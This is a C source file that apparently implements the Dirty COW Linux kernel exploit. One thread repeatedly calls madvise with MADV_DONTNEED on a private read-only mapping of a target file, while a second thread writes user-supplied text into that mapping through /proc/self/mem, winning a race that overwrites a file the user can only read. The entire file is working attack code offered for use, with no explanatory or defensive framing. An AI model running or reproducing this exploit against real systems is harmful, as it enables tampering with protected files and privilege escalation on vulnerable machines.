#include <sys/mman.h> //mmap
#include <stdlib.h> //exit
#include <unistd.h> //access
#include <sys/types.h> //stat
#include <sys/stat.h>
#include <stdio.h> //printf
#include <string.h> //strlen
#include <fcntl.h>
#include <pthread.h> // thread

#define LOOP_TIMES 10000000

void* madvise_thread(void* arg);
void* write_to_file(void* str);

void* map;

int main(int argc, char** argv) 
{

	if (argc < 3) {
		printf("usage: ./exploit file_name what_to_write\n");
		exit(0);
	}

	const char* file_name = argv[1];
	const char* str_to_write = argv[2];

	if (access(file_name, F_OK) == -1) {
		printf("%s: does not exist\n", file_name);
		exit(0);
	}

	const int file_fd = open(file_name, O_RDONLY);
	if (file_fd == -1) {
		printf("failed at opening the file\n");
		exit(0);
	}

	struct stat file_info;
	if (stat(file_name, &file_info) == -1) {
		printf("could not get file info using stat\n");
		exit(0);
	}

	// mmap the file to our memory so i can access it from /self/mem
	map = mmap(	  NULL, 
				  (size_t) file_info.st_size, 
				  PROT_READ,
				  MAP_PRIVATE,
				  file_fd,
				  0);

	if (map == MAP_FAILED) {
		printf("failed mmaping file to our process memory\n");
		exit(0);
	}
	printf("[+] mapped file %p\n", map);


	pthread_t ptid;
	pthread_t ptid2;

	pthread_create(&ptid, NULL, &madvise_thread, NULL);
	pthread_create(&ptid2, NULL, &write_to_file, (void*)str_to_write);
	
	pthread_join(ptid2, NULL);

	return 0;
}

void* madvise_thread(void* arg) 
{
	printf("[+] started running madvise thread\n");

	for (int i = 0; i < LOOP_TIMES; i++) {
		madvise(map, 100, MADV_DONTNEED);
	}

	printf("[+] finished running madvise thread\n");
}

void* write_to_file(void* str) 
{
	printf("[+] started writing_to_file thread\n");

	const unsigned int mem_fd = open("/proc/self/mem", O_RDWR);
	const unsigned int len = strlen((char*)str);
	
	for (int i = 0; i < LOOP_TIMES; i++) {
		lseek(mem_fd, (long int)map, SEEK_SET);
		write(mem_fd, (char*)str, len);
	}

	printf("[+] finished running write_to_file thread \n");
}



